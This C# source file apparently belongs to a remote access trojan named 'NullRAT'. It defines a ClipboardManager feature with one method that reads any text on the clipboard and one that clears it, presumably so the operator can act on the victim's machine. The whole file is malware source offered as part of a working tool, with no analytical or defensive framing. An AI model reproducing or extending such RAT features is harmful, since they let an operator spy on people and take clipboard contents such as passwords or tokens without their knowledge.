using System.Windows.Forms;

namespace NullRAT.Features
{
    public static class ClipboardManager
    {
        public static string Get()
        {
            return Clipboard.ContainsText() ? Clipboard.GetText() : "Clipboard empty.";
        }

        public static string Clear()
        {
            Clipboard.Clear();
            return "Clipboard cleared.";
        }
    }
}